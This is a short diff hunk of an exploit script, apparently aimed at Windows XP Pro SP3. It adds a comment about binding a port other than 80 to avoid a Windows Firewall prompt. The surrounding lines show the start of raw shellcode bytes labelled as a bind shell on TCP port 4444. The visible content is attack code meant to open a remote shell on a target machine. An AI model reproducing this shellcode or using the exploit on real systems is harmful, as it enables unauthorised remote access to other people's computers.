@@ -8,6 +8,7 @@ import sys
 # Exploit tested on Windows XP Pro SP3 FR
 
 # bind shell tcp on port 4444
+# As Windows Firewall ask for exception in order to listen on port 80, it is possible to bind another port with default settings.
 shellcode=  b""
 shellcode+= b"\xda\xd0\xd9\x74\x24\xf4\x5e\xbf\xb0\xe1\x34\x9e\x31"
 shellcode+= b"\xc9\xb1\x53\x31\x7e\x17\x83\xc6\x04\x03\xce\xf2\xd6"
